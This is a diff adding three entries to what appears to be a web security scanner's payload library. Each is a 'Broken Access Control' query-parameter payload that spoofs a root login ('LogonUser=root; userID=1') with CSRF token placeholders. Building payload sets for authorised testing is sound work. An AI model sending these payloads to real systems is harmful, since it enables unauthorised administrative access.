@@ -13242,5 +13242,38 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-474673",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "LANG=en_US; LogonUser=root; userID=1; wf_CSRF_token=#{csrf_token}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-474674",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{token}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-474675",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{cookie}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
